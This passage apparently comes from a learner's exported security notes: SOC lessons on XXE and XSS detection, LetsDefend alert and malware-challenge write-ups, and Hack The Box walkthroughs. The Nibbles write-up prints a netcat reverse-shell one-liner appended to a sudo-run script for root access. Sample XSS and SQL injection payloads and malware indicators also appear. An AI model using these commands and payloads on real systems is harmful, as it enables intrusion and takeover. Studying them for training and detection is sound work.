on behalf of the server, allowing them to scan internal networks, exploit other vulnerabilities, and carry out further attacks.\nDenial of service (DoS): An attacker can use an XXE vulnerability to launch a DoS attack by sending an XML input that causes the server to consume excessive resources, such as memory or CPU time.\nRemote code execution (RCE): In some cases, an attacker can use an XXE vulnerability to execute arbitrary code on the server, allowing them to take full control of the server and carry out further attacks.\n\nTherefore, it is important to identify and remediate XXE vulnerabilities in web applications to prevent these and other harmful outcomes. Best practices for preventing XXE attacks include properly validating and sanitizing all XML input, disabling the processing of external entities, and using the latest secure versions of XML parsers and frameworks.\nPrevention Methods for XML External Entity\nThere are several best practices that can help prevent XXE attacks:\nDisable external entities: One of the most effective ways to prevent XXE attacks is to disable the processing of external entities in the XML parser configuration. This can be done by setting the appropriate parser configuration or using a secure XML parser that has external entity processing disabled by default.\nInput validation and sanitization: Always validate and sanitize all XML input before parsing it. This includes checking for malicious input such as nested XML entities, XML injections, and other forms of malicious input.\nUse secure parsers: Use the latest version of a secure XML parser that has been specifically designed to prevent XXE attacks. These parsers have features that can help detect and prevent XXE attacks.\nUse whitelist filtering: Implementing a whitelist of allowed entities and DTDs can help reduce the risk of XXE attacks by blocking any input that is not on the whitelist.\nImplement access controls: Implement proper access controls to restrict access to sensitive data and resources. This can help limit the damage in case an XXE vulnerability is exploited.\nUse secure coding practices: Use secure coding practices, such as input validation, data sanitization, and error handling, to minimize the risk of XXE attacks.\nBy implementing these best practices, you can significantly reduce the risk of XXE attacks in your web application. It is important to keep up-to-date with the latest security best practices and patches for your web application, and to periodically perform security assessments to identify and remediate any vulnerabilities.\nHere’s an example of vulnerable PHP code that is susceptible to XML External Entity attacks:\n\nThe code above loads an XML input from the php://input stream and passes it directly to the loadXML() method of the DOMDocument class without any validation or sanitization. This makes it vulnerable to XXE attacks.\nTo fix this vulnerability, we need to validate and sanitize the XML input and disable external entities. Here is an example of a fixed version of the code:\n\nIn the code above, we have disabled external entities using the function libxml_disable_entity_loader(), which prevents XXE attacks. We have then validated and sanitized the XML input using a regular expression that only allows alphanumeric and underscore characters. If the input passes validation, we load it into the DOMDocument object and output the sanitized XML. If the input fails validation, we output an error message.\nThis fixed code ensures that the XML input is properly validated, sanitized, and processed securely, and is much less vulnerable to XXE attacks.\nDetecting XML External Entity Attacks\nIn Part 1, we have overviewed what the XML External Entity is and how to prevent this vulnerability. In this part, we’ll have a look at the detection techniques and some tips to make it easier. Before moving on let’s take a quick look for example payloads for the XML External Entity vulnerability;\nBasic XXE Payload\n\nBlind XXE Payload\n\nXXE Payload with PHP Filter\n\nHere’s an example of what an Nginx log might look like when an XXE attack occurs via a vulnerable parameter on a GET request (This methodology is the same as analyzing POST requests):\n\nIn this log, the IP address of the client making the request is 123.45.67.89. The request was a GET request to the processXML endpoint, with an xml parameter that contains an XXE payload. The XXE payload attempts to read the contents of the /etc/passwd file. The response code is 200, indicating that the request was successful, and the response size is 143 bytes. The user agent string indicates that the request was made from a Chrome browser on a Windows 10 machine.\n\nThe most important things to detect XXE attacks on the logs, you should check specific keyword like;\n\nDOCTYPE\nELEMENT\nENTITY\n\nSo for the detecting !DOCTYPE keyword in nginx logs, we can use regex like;\n^(\\S+) - (\\S+) [(.?)] ”(\\S+) (.?)?(?=.?\\b21DOCTYPE\\b).? HTTP/\\d.\\d” (\\d+) (\\d+) ”(.?)” ”(.?)”\n\n21 is for the encoded version of the ! character. Because !DOCTYPE is equal to %21DOCTYPE. This regex will match the following line on the example that we have shared above;\n\nAnd decoded versions are;\n\nSo, it can be clearly seen that the user sends to XXE payload from source IP 123.45.67.89 on dates 30/Apr/2023:12:34:57 and 30/Apr/2023:12:34:59."},"SOC/XSS-Attack":{"title":"XSS Attack","links":["SOC/OWASP"],"tags":[],"content":"What is Cross-Site Scripting (XSS)?\nCross-site scripting (XSS) is a type of injection-based web security vulnerability that can be incorporated into legitimate web applications, allowing malicious code to be executed.\n\nToday, most frameworks used to develop web applications have taken preventative measures against cross-site scripting attacks. However, we still see XSS vulnerabilities today because frameworks are sometimes not used, or the framework itself has an XSS vulnerability and the data coming from the user is not sanitized.\nTypes of XSS\nThere are 3 types of XSS. These are:\n\n\nReflected XSS (Non-Persistent): This is a non-persistent type of XSS where the XSS payload must be present in the request. It is the most common type of XSS.\n\n\nStored XSS (Persistent): This type of XSS is where the attacker can permanently upload the XSS payload to the web application. Compared to other types, Stored XSS is the most dangerous type of XSS.\n\n\nDOM Based XSS: DOM Based XSS is an XSS attack where the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client-side script so that the client-side code runs in an “unexpected” manner. (OWASP)\n\n\nHow does XSS work?\nLike other web attack methods, XSS is a vulnerability that is caused by a lack of data sanitization. It occurs when the data received from the user is sent in the response without being sanitized.\nLet’s look at an example to understand XSS attacks better.\n\nFirst, we’ll examine the piece of code above. What it does is actually quite simple. It simply displays whatever is entered in the ‘user’ parameter. If we enter “LetsDefend” as the ‘user’ parameter, we will see the words “Hello LetsDefend”.\n\nSo far there is no problem. If we enter the appropriate data in the user parameter, we are greeted with a warm welcome. But, as we have already seen, there is no control mechanism for the user parameter. This means that whatever we put in the “user” parameter will be included in the HTTP response we receive back.\nSo what would happen if we didn’t enter a normal value, but instead a payload that would trigger a popup?\nPayload: alert(1)\n\nBecause whatever is put in the ‘user’ parameter is included directly in the HTTP response, the javascript code we wrote worked and a pop-up window appeared on the screen.\nThis is exactly how XSS works. Because the value entered by the user is not validated, the attacker can enter any javascript code and get the result they want. Another question is, what if the attacker wants to redirect the user to a malicious site?\nPayload: window.location=’google.com’\nletsdefend.io/xss_example.php%3Cscript%3Ewindow.location=%27google.com%27%3C/script%3E\n\nOf course we are not going to direct you to a web application. Directing you to Google will be sufficient as an example. When the user clicks on the URL he will be directed to Google instead of the perfect LetsDefend web application. \n\nHow Attackers Take Advantage of XSS Attacks\nBecause XSS is a client-based attack method, it may seem less important than other attack methods, but XSS attacks and their impact should not be taken for granted.\nAttackers can do the following with an XSS attack:\n\n\nSteal a user’s session information\n\n\nCapture credentials\n\n\nEtc.\n\n\nHow to Prevent a XSS Vulnerability\n\nSanitize data coming from a user: Never trust data that you receive from a user. If user data needs to be processed and stored, it should first be encoded with “HTML Encoding” using special characters, only then can it be stored.\nUse a framework: Most frameworks come with preventative measures against XSS attacks.\nUse the framework correctly: Almost all frameworks used to develop web applications come with a sanitation feature, but if this is not used properly, there is still a chance for XSS vulnerabilities to occur.\nKeep your framework up-to-date: Frameworks are developed by humans, so they too can contain XSS vulnerabilities. However, these types of vulnerabilities are usually patched with security updates. You should therefore make sure that you have completed the security updates for your framework on a regular basis.\n\nDetecting XSS Attacks\nAs XSS is one of the most commonly tested vulnerabilities.\n\nLook for keywords: The easiest way to detect XSS attacks is to look for keywords such as “alert” and “script” that are commonly used in XSS payloads.\nLearn about commonly used XSS payloads: Attackers tend to use the same payloads to look for vulnerabilities before exploiting an XSS vulnerability. Therefore, familiarizing yourself with commonly used XSS payloads would make it easier for you to detect XSS vulnerabilities. You can examine some commonly used payloads here.\nCheck for the use of special characters: Check data coming from a user to see if any special characters commonly used in XSS payloads, such as greater than (&gt;) or less than (&lt;), are present.\n\nAn Example of Detection\nIn this example, we have access logs from an Apache server running WordPress. Don’t forget to revisit our lesson “Detecting SQL injection attacks” for more information about access logs.\n\nLet’s examine the access logs provided.\nFirst, let’s take a general look at the requests that were made and try to understand them. We can see that all the requests were made for the “/blog/” page and that only the “s” parameter values were changed. If you pay attention to the URLs of the websites you visit, you probably have noticed before that when you perform a search in WordPress, the words you enter are sent with the “?s=” parameter. The example we are looking at shows us that these are searches carried out in WordPress.\nIt is difficult to find examples that are easy to read, such as the example in the lesson ” Detecting SQL Injection Attacks “. Instead, we usually come across characters that have been converted to %XX as a result of URL encoding. We’ll do URL decoding next, but first, let’s look at the URLs and see if we can spot any words.\nLooking at the logs, there are javascript-related words such as “script”, “prompt” and “console.log”. The word javascript immediately brings XSS to mind. If we decode the URL, we can easily understand the requests being made.\n\nLet’s take another look at the access logs after decoding the URLs. We can clearly see the XSS payloads and definitely conclude that the WordPress application from which we received these access logs has been the victim of an XSS attack.\nWhen we examine the requested IP addresses, we find that there is more than one. Is there more than one attacker trying to perform an XSS attack at the same time? Or is the attacker constantly changing their IP address to avoid being blocked by security products such as firewalls and IPS? If you check the IP address, you will see that it belongs to Cloudflare. Since WordPress has a partnership with Cloudflare, it is quite normal that Cloudflare would be the source of the request.\n\nNow, if we look at the dates of the requests, we see that a request was made every 3-4 seconds. It is not really possible for a human to try to enter that many XSS payloads in such a short time, but it still doesn’t mean you can be sure that the number of requests made per second is excessive. Because we have the user-agent information in this example, our job is easier. Once we check the information, we see that it belongs to a urllib library. This indicates that these requests were made by an automated vulnerability scanner tool.\nSo was the attack successful? \nWithout access to the responses, we cannot be sure.\nAs a result of our investigations:\n\nIt is clear that the attack was aimed at the web application where the access logs came from.\nLooking at the number of requests and the user agent information, we determined that the attack was carried out by an automated vulnerability scanner.\nAs the application is hosted behind Cloudflare, the source IP addresses were not found.\nWe do not know if the attack was successful or not.\n"},"SOC/fuzzy-hashing":{"title":"fuzzy hashing","links":[],"tags":[],"content":"Fuzzy hashing helps us to perform similarity analysis - match two files with minor differences based on the fuzzy hash values.\nOne of the examples of fuzzy hashing is the usage of SSDeep. SSDEEP creates a hash value that attempts to detect the level of similarity between two files at the binary level. This is different from a cryptographic hash (like SHA1) because a cryptographic hash can check exact matches (or non-matches)."},"Tools":{"title":"Tools","links":[],"tags":[],"content":"\n\nwww.virustotal.com/\n\n\nwww.abuseipdb.com/\n\n\nany.run/\n\n\ntalosintelligence.com/reputation_center/\n\n"},"Writeups/CTF/EscapeTwo":{"title":"EscapeTwo","links":[],"tags":[],"content":"Machine Info:\n- Easy\n- Windows\n- IP: 10.129.240.7\n- Incomplete\n\nSteps\n1. Reconnainsce\nNmap Scan\nCommand\nnmap -sV -oA EasyTwo-nmap 10.129.240.7 --open\nResult\nPORT     STATE SERVICE               VERSION\n53/tcp   open  domain                Simple DNS Plus\n88/tcp   open  kerberos-sec          Microsoft Windows Kerberos (server time: 2025-01-12 08:20:02Z)\n135/tcp  open  msrpc                 Microsoft Windows RPC\n139/tcp  open  netbios-ssn           Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http            Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap              Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n1433/tcp open  ms-sql-s              Microsoft SQL Server 2019 15.00.2000\n3269/tcp open  ssl/globalcatLDAPssl?\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows"},"Writeups/CTF/Nibbles":{"title":"Nibbles","links":["'app.hackthebox.com'","HTB/Nmap","HTB/ssh","HTB/Banner-grabbing","HTB/Gobuster","HTB/Metasploit","HTB/Reverse-Shell"],"tags":[],"content":"This is a retired machine, part of Getting Started Module of Hack The Box\nSteps Taken\nReconnaissance\nNmap Scan\nCommand\nnmap -sV -oA 01-04-2025-11-44-Nibbles-nmap 10.129.207.130 --open\nResult\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n \nConclusion\nThe host is running a apache server and is hosting a website and also has a ssh enabled and listening.\nBanner grabbing\nNo fruitful result obtained, got the same header as in nmap scan.\nVisiting the webpage\nThere is an interesting comment\n&lt;!--- /nibbleblog/ directory. Nothing interesting here! ---&gt;\nThere is nothing else on the webpage.\nGoing to the /nibbleblog directory\nThe website seems to be hosting a blog. We can note:\n\nThe blog seems to be ran using nibbleblog.\nThe website is using php.\nNothing else is there on the site\n\nEnumerating directories\nSince nothing much of our interest can be found I will enumerate directories using Gobuster. Couldn’t find anything with common.txt so using few other dictionaries to scan.\nMistake: Was enumerating the root url when I was supposed to enumerate the /nibbleblog. Found out after trying few wordlists and not finding any directories.\nCommand\ngobuster dir -u 10.129.207.130/nibbleblog -w /usr/share/wordlists/dirb/common.txt\nOutput\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.hta                 (Status: 403) [Size: 304]\n/.htaccess            (Status: 403) [Size: 309]\n/.htpasswd            (Status: 403) [Size: 309]\n/admin                (Status: 301) [Size: 327] [--&gt; http://10.129.207.130/nibbleblog/admin/]\n/admin.php            (Status: 200) [Size: 1401]\n/content              (Status: 301) [Size: 329] [--&gt; http://10.129.207.130/nibbleblog/content/]\n/index.php            (Status: 200) [Size: 2987]\n/languages            (Status: 301) [Size: 331] [--&gt; http://10.129.207.130/nibbleblog/languages/]\n/plugins              (Status: 301) [Size: 329] [--&gt; http://10.129.207.130/nibbleblog/plugins/]\n/README               (Status: 200) [Size: 4628]\nConclusion\nWe can see few directories:\n\n/admin.php\nAppears to be login page. Tried few login combo but immediately got blacklisted. Can’t bruteforce\n/admin\nContains file system with codes mostly .php and .bit. Couldn’t find anything useful.\n/content\nJackpot! Contains /private /public and /tmp folders. Looking into /private, it has lost of files including a users.xml file which showed that admin user existed and 2 blacklisted ips.\nOther directories had nothing useful to be found.\nSo far, we only know:\nadmin user exists but can’t login cuz blacklisted,\nWebsite uses nibbleblog.\n\nLooking for nibbleblog vulnerability\nA google search later, I found that nibbleblog has a severe file upload vulnerability. We can use Metasploit to take advantage of this vulnerability and summon a Reverse Shell. We need username and password for this vulnerability.\nDeadend: The vulnerability requires a user login creds. We have run out of reconnaissance. Lets go back and make sure nothing is left out. Rechecking the exposed files in /content, the word nibbles was repeated, in &lt;name&gt; tag and more importantly in email as admin@nibbles.com, on guessing nibbles as password, and we were successfully in. Now we could use the vulnerability.\nContinuing we successfully connect a Reverse Shell to the target. We can read the user.txt now.\nPrevilege Escalation\nHas no sudo,wget,curl. The answer has to be in the personal.zip file. Has no unzipcommand as well. Found out that I was using Metasploit’s meterpreter and it wasn’t actually the shell. So I had to run shell command to get to shell which wasn’t even tty shell. Now, the real deal was personal.zip file indeed. After unzipping it, I found that it had a backup script which the user could run as sudo. Then it was matter of appending it with a reverse shell. The shell was run as root which gave us root access.\necho &#039;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.18 8443 &gt;/tmp/f&#039; | tee -a monitor.sh\nThe first part is reverse shell, then tee -a to append it to monitor.sh which we can run as sudo."},"Writeups/Challenges/Malicious-VBA":{"title":"Malicious VBA","links":["Writeups/Challenges/invoice.vb","Writeups/Challenges/invoice_deobfuscated.vb"],"tags":[],"content":"Background\nOne of the employees has received a suspicious document attached in the invoice email. They sent you the file to investigate. You managed to extract some strings from the VBA Macro document. Can you refer to CyberChef and decode the suspicious strings?\nPlease, open the document in Notepad++ for security reasons unless you are running the file in an isolated sandbox.\nMalicious Macro: invoice.vb\nDeobfuscated file (by: ME): invoice_deobfuscated.vb\nQuestions\n\n\nThe document initiates the download of a payload after the execution, can you tell what website is hosting it?\n→ tinyurl.com/g2z2gh6f\n\n\nWhat is the filename of the payload (include the extension)?\n→ dropped.exe\n\n\nWhat method is it using to establish an HTTP connection between files on the malicious web server?\n→ MSXML2.ServerXMLHTTP\n\n\nWhat user-agent string is it using?\n→ Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\n\n\nWhat object does the attacker use to be able to read or write text and binary files?\n→ ADODB.Stream\n\n\nWhat is the object the attacker uses for WMI execution? Possibly they are using this to hide the suspicious application running in the background.\n→ winmgmts:\\.\\root\\cimv2:Win32_Process\n\n\nSolution\nFirst step is to deobfuscate the file. Took shit ton of time to and decoded all the strings. They are just put as ascii codes which need to be converted into char and concatinated. Once strings are decoded, the functions are pretty self-explanatory. I have attached the deobfuscated file at the top. After obfuscaton, the answers are right infront of us."},"Writeups/Challenges/Phishing-Email":{"title":"Phishing Email","links":[],"tags":[],"content":"About\nYour email address has been leaked and you receive an email from Paypal in German. Try to analyze the suspicious email.\nFile location: C:\\Users\\LetsDefend\\Desktop\\Files\\PhishingChallenge.zip\nPassword: infected\nQuestions\n\n\nWhat is the return path of the email?\n→ bounce@rjttznyzjjzydnillquh.designclub.uk.com\n\n\nWhat is the domain name of the url in this mail?\n→ storage.googleapis.com\n\n\nIs the domain mentioned in the previous question suspicious?\n→ yes\n\n\nWhat is the body SHA-256 of the domain?\n→ 13945ecc33afee74ac7f72e1d5bb73050894356c4bf63d02a1a53e76830567f5\n\n\nIs this email a phishing email?\n→ Yes\n\n\nAnalysis\nThe file contained the copy of email which was sent to us. Viewing the source of email, we can uncover some of the answers such as the return path. The email has a button which leads to google storage api. Paypal would not use google storage api. The url is as sus as the email itself is but at least its not some shady website url. Opening the url in browser, it is getting blocked.\nAnalyzing the url, in virustotal, 1 vendors flag as malicious and has -171 community score. We can note the SHA-256 of the domain and conclude that this is a harmful phishing attempt."},"Writeups/SOC-Alerts/SOC104-1":{"title":"SOC104 1","links":[],"tags":[],"content":"Alert\n\nEventID: 36\nEvent Time: Dec, 01, 2020, 10:23 AM\nRule: SOC104 - Malware Detected\nLevel: Security Analyst\nSource Address: 10.15.15.18\nSource Hostname: AdamPRD\nFile Name: Invoice.exe\nFile Hash: f83fb9ce6a83da58b20685c1d7e1e546\nFile Size: 473.00 KB\nDevice Action: Allowed\nFile (Password:infected): Download\n\nAnalysis\nMalware Analysis\nThe file was a zip file which was immediately blocked by chrome. After download, it  was ran through virustotal &amp; Anyrun whose report are:\nVirustotal\n\nURL: www.virustotal.com/gui/file/77b2731ff3c7a14b8b962ea387c41293415b3478e73973888851991105777560\nResult: 7 vendors flagged it as trojan. The bundled file was  Maze.exe(e8a091a84dd2ea7ee429135ff48e9f48f7787637ccb79f6c3eb42f34588bc684)\n\nAnyRun\nURL:app.any.run/tasks/83f446df-c888-44b7-9db7-330211161c69\nThe file was a Ransomware. It immediately started modifying files in appdata. It sent tcp connection to 92.63.8.47 ip address only. Running the ip address through abuseipdb, it has been associated with maze ransomware.\nC2 Access\nChecking if the C2 server was accessed through logs. Unfortunately, there is an entry of the C2 server in logs. It was accessed by 10.15.15.18 which belongs to our victim system few minutes after the file was downloaded. This means our endpoint has been compromised but the malicious file has not yet spread.\nEndpoint\nThe endpoint has been contained.\nConclusion\nThe alert is truepositive. The malicious file was a ransomware and the endpoint is infected. Logs indicated that the C2 server was accessed by the victim host only so the malware has not yet propagated through the network. The host has been contained and needs further action."},"Writeups/SOC-Alerts/SOC104-2":{"title":"SOC104 2","links":[],"tags":[],"content":"Alert\n\nEventID: 84\nEvent Time: Mar, 21, 2021, 01:04 PM\nRule: SOC104 - Malware Detected\nLevel: Security Analyst\nSource Address: 172.16.17.5\nSource Hostname: SusieHost\nFile Name: winrar600.exe\nFile Hash: c74862e16bcc2b0e02cadb7ab14e3cd6\nFile Size: 2.95 Mb\nDevice Action: Allowed\nFile (Password: infected): Download\n\nAnalysis\nMalware Analysis\nThe file was a zip file which was immediately blocked by chrome. After download, it  was ran through virustotal &amp; Anyrun whose report are:\nVirustotal\n\nURL: www.virustotal.com/gui/file/aff4bb9b15bccff67a112a7857d28d3f2f436e2e42f11be14930fe496269d573/detection\nResult:\n\nSAFE\nOnly 1 vendor flagged it as malicious\nNo malicious domains\nValid signature\nAuthentic winrar executable\n\n\n\nAnyRun\n\nURL:app.any.run/tasks/0786f88e-c614-48c1-bc16-6270455ed826\nResult:\n\nDetects as 100/100 malicious.\nOn looking at indicators, they seem reasonable for the installer.\nThere are no malicious activities.\nThe detection system was thrown off likely because of nature of executable.\n\n\n\nEndpoint\nNothing sus.\nConclusion\nThe executable is SAFE and this is a falsepositive."},"Writeups/SOC-Alerts/SOC104":{"title":"SOC104","links":[],"tags":[],"content":"ALERT\n\nEventID: 14\nEvent Time: Sep, 15, 2020, 09:02 PM\nRule: SOC104 - Malware Detected\nLevel: Security Analyst\nSource Address: 172.16.17.82\nSource Hostname: JohnComputer\nFile Name: googleupdate.exe\nFile Hash: 0bca3f16dd527b4150648ec1e36cb22a\nFile Size: 152.45 KB\nDevice Action: Allowed\nFile (Password:infected): Download\n\nAnalysis\n\nVirustotal: Clean\nAnyrun: Clean\n\nResult\nThe alert is false positive and was caused by download of google update. The file was scanned in virustotal and ran through anyrun and both platforms confirmed that it was not malicious. No further action is required."},"Writeups/SOC-Alerts/SOC109":{"title":"SOC109","links":[],"tags":[],"content":"Alert\n\nEventID: 85\nEvent Time: Mar, 22, 2021, 09:06 PM\nRule: SOC109 - Emotet Malware Detected\nLevel: Security Analyst\nSource Address: 172.16.17.45\nSource Hostname: RichardPRD\nFile Name: 1word.doc\nFile Hash: 349d13ca99ab03869548d75b99e5a1d0\nFile Size: 188.95 Kb\nDevice Action: Cleaned\nFile (Password:infected): Download\n\nAnalysis\nThe file was extracted and ran through virustotal &amp; anyrun:\nMalware Analysis\n1. Virustotal\n\nURL: www.virustotal.com/gui/file/d34849e1c97f9e615b3a9b800ca1f11ed04a92b1014f55aa0158e3fffc22d78f\nReport:\n\nMalicious 48 vendors reported\nUses macro to drop malware into the system\n\n\n\n2. Anyrun\n\nURL: app.any.run/tasks/80495aaf-6841-40c7-846e-481546ca8299\nReport:\n\nMalicious urls:\n\ngrml.net (85.214.109.143)\ngetming.com (168.206.6.156)\nevilnerd.org (81.169.145.160)\n\n\n100/100 Malicious score\nDrops Malware\n\n\n\nLog Analysis\nThere is no record of host accessing any of the malicious urls found during malware analysis. We can hence conclude that the malware was not executed.\nReport\nThe file “1word.doc” was confirmed to be malicious, utilizing macros to drop malware into the system. Multiple security vendors identified the file as a threat. However, the analysis revealed that the host did not access any of the malicious URLs associated with the malware, indicating that the malware was not executed. The threat has been neutralized, and the device action successfully cleaned it."},"Writeups/SOC-Alerts/SOC114":{"title":"SOC114","links":[],"tags":[],"content":"Alert\n\nEventID : 45\nEvent Time : Jan, 31, 2021, 03:48 PM\nRule : SOC114 - Malicious Attachment Detected - Phishing Alert\nLevel : Security Analyst\nSMTP Address : 49.234.43.39\nSource Address : accounting@cmail.carleton.ca\nDestination Address : richard@letsdefend.io\nE-mail Subject : Invoice\nDevice Action : Allowed\n\nAction\nAttachment\nc9ad9506bcccfaa987ff9fc11b91698d was present is the email whose password was infected. In Virustotal 34/60 vendors flagged it as trojan. The file contained an spreadsheet.\nWas it opened?\nThe email is harmful and was successfully delivered. Deleted it immediately.\nChecking logs of that day, right after email was delivered following url was invoked andaluciabeach.net/image/network.exe which is fagged as malicious by 13 vendors in virustotal. The host is now infected. On further investigation, there was juicypotato.exe running on the host. The host was contained immediately."},"Writeups/SOC-Alerts/SOC119":{"title":"SOC119","links":[],"tags":[],"content":"Alert\n\nEventID: 83\nEvent Time: Mar, 21, 2021, 01:02 PM\nRule: SOC119 - Proxy - Malicious Executable File Detected\nLevel: Security Analyst\nSource Address: 172.16.17.5\nSource Hostname: SusieHost\nDestination Address: 51.195.68.163\nDestination Hostname: win-rar.com\nUsername: Susie\nRequest URL: www.win-rar.com/postdownload.html\nUser Agent: Chrome - Windows\nDevice Action: Allowed\n\nAnalysis\nDestinaiton Host\nThe destinaiton win-rar.com is a legit website of winrar which serves the app downloads. Running ip through abuseipdp, the ip address belongs to the site and there is no spoofing.\nURL\nThe url drops an executable “WinRar.exe” (a911bbfab70c7545307b9dbcb06273d899ca03aad928f0b66d55b41c25cb4f14). Running the executable through Virustotal, the file is clean and is legit winrar installer.\nConclusion\nThe alert was triggered by a legitimate download of the WinRAR installer from the official website. The executable file is clean and safe, as confirmed by VirusTotal. No further action is required."},"Writeups/SOC-Alerts/SOC120":{"title":"SOC120","links":[],"tags":[],"content":"Alert\n\nEventID : 52\nEvent Time : Feb, 07, 2021, 04:24 AM\nRule : SOC120 - Phishing Mail Detected - Internal to Internal\nLevel : Security Analyst\nSMTP Address : 172.16.20.3\nSource Address : john@letsdefend.io\nDestination Address : susie@letsdefend.io\nE-mail Subject : Meeting\nDevice Action : Allowed\n\nAnalysis\nStuyding the 172.16.20.3, it happens to be Exchange Server in our network. There seems to be no trace of the Exchange Server getting hacked. This email might have been spoofed or sth.\nAnalyzing the email, the email seems legit, there is no attachments or url and contains valid subject.\nAnalyzing logs, there is no communication with any suspicious addresses.\nReport\nThe alert is False Positive. The email contain no harmful attachment or url. Hosts seem normal. The cause of false positive needs further investigation."},"Writeups/SOC-Alerts/SOC138":{"title":"SOC138","links":[],"tags":[],"content":"Alert\n\nEventID: 77\nEvent Time: Mar, 13, 2021, 08:20 PM\nRule: SOC138 - Detected Suspicious Xls File\nLevel: Security Analyst\nSource Address: 172.16.17.56\nSource Hostname: Sofia\nFile Name: ORDER SHEET &amp; SPEC.xlsm\nFile Hash: 7ccf88c0bbe3b29bf19d877c4596a8d4\nFile Size: 2.66 Mb\nDevice Action: Allowed\nFile: Download  (Password:infected)\n\nAnalysis\nMalware Analysis\n1. Virustotal\n\nURL:www.virustotal.com/gui/file/7bcd31bd41686c32663c7cabf42b18c50399e3b3b4533fc2ff002d9f2e058813\nReport:\n\n***Malicious\nCve-2017-11882\nUses heavily obfuscated code to execute commands and drop files.\nConnections:\n\nTCP 204.79.197.203:443\nTCP 209.85.200.94:443\nTCP 177.53.143.89:443 (multiwaretecnologia.com.br)\nTCP 52.114.76.35:443\nTCP 172.217.17.142:443 (drive.google.com)\nTCP 185.157.161.61:52360 (wealthybillionaire.ddns.net)\n\n\n\n\n\n2. AnyRun\n\nURL: app.any.run/tasks/a4bc64cb-aac8-49d4-a451-bcf37a702508\nReport:\n\nConnections\n\n52.109.32.97\n20.74.47.205\n20.223.35.26\n4.245.163.56\n\n\nReport\n\nThe file is corroupted. Didn’t access any malicious ips. The contacted addresses above are legit microsoft addresses.\n\n\n\n\n\nLogs &amp; C2\nOn checking logs, the host has accessed one of the malicious ips, 177.53.143.89. The host has been compromised.\nEndpoint\nThere  is a malicious powershell command which ran a obfuscated code. The host was contained immediately.\nReport\nThe phishing file has infected the host. The logs indicates that connection to C2 server has been made. Further, there is a malicious code executed in powershell. The hos has been contiained for now and needs further investigation."},"Writeups/SOC-Alerts/SOC145":{"title":"SOC145","links":[],"tags":[],"content":"Alert\n\nEventID: 92\nEvent Time: May, 23, 2021, 07:32 PM\nRule: SOC145 - Ransomware Detected\nLevel: Security Analyst\nSource Address: 172.16.17.88\nSource Hostname: MarkPRD\nFile Name: ab.exe\nFile Hash: 0b486fe0503524cfe4726a4022fa6a68\nFile Size: 775.50 Kb\nDevice Action: Allowed\nFile (Password: infected): Download\n\nAnalysis\nMalware Analysis\n1. Virustotal\n\nURL: www.virustotal.com/gui/file/1228d0f04f0ba82569fc1c0609f9fd6c377a91b9ea44c1e7f9f84b2b90552da2\nReport:\n\nMalicious. 61 vendors detected it as ransomware.\n\n\n\n2. Anyrun\n\nURL: app.any.run/tasks/7cf5c2e9-e692-4d77-b87c-4f565a3c2ed4\nReport:\n\nConnections:\n\n192.168.100.1\n\n\nExtracted URLS:\n\nwww.torproject.org\nWe are unable to find any C2 addresses. Maybe the malware is using VM evading techniques.\n\n\n\n\n\nLogs &amp; C2\nChecking logs to see if any sus connections were made by the host after the malware was detected. There are no sus connections. We can assume that the the connection was not made.\nEndpoint\nThe endpoint has ab.exe running. The host has been compromised. Contained the host immediately.\nReport\nThe host system was compromised by ransomware identified as ab.exe. No immediate communication with Command and Control (C2) servers was detected. However, due to the nature of the malware and its potential for evasion techniques, immediate containment was done and further detailed analysis of the host is required to prevent any potential spread or additional compromise."},"Writeups/SOC-Alerts/SOC146":{"title":"SOC146","links":["phishing"],"tags":[],"content":"Alert\n⭐ This alert was generated from a real phishing attack.\n\nEventID : 93\nEvent Time : Jun, 13, 2021, 02:13 PM\nRule : SOC146 - Phishing Mail Detected - Excel 4.0 Macros\nLevel : Security Analyst\nSMTP Address : 24.213.228.54\nSource Address : trenton@tritowncomputers.com\nDestination Address : lars@letsdefend.io\nE-mail Subject : RE: Meeting Notes\nDevice Action : Allowed\nAttachment : 11f44531fb088d31307d87b01e8eabff\n\nPassword: infected\n\n\n\nAnalysis\n\nVirustotal Results:\n\nAttachment: 32/66\nDomain: 0/94\nIP Address: 0/94\n\n\nEmail Delivered: True\nAttachment Opened: False\n\nReport\nA malicious zip file was sent to lars@letsdefend.io by trenton@tritowncomputers.com on June 13 2021. The file contained a infected excel macro. The email was delivered using 24.213.228.54 server and successfully entered user’s inbox. The email contents were not downloaded by the user and hence the phishing attack was unsuccessful."},"Writeups/SOC-Alerts/SOC165":{"title":"SOC165","links":["SOC/SQL-Injection"],"tags":[],"content":"Alert\n\nEventID : 115\nEvent Time : Feb, 25, 2022, 11:34 AM\nRule : SOC165 - Possible SQL Injection Payload Detected\nLevel : Security Analyst\nHostname : WebServer1001\nDestination IP Address : 172.16.17.18\nSource IP Address : 167.99.169.17\nHTTP Request Method : GET\nRequested URL : https://172.16.17.18/search/?q=%22%20OR%201%20%3D%201%20—%20-\nUser-Agent : Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1\nAlert Trigger Reason : Requested URL Contains OR 1 = 1\nDevice Action : Allowed\n\nAnalysis\n\nDecoded URL : https://172.16.17.18/search/?q=” OR 1 = 1 — -\nThe traffic is coming from outside (Internet);\nAbuseipdb report:\n\nISP: DigitalOcean, LLC\nUsage Type: Data Center/Web Hosting/Transit\nASN: AS14061\nDomain Name: digitalocean.com\nCountry: United States of America\n\n\nOverall the reputation of ip is mostly neutral.\nSuccess?\n\nThe response size is small and same.\nThere is no sign of host being pawned.\nUnsuccessful → No escalation\n\n\n\nReport\nOn Feb, 25, 2022, 11:34 AM, an unknown ip 167.99.169.17 attempted SQL Injection on 172.16.17.18. There was a single attempt done 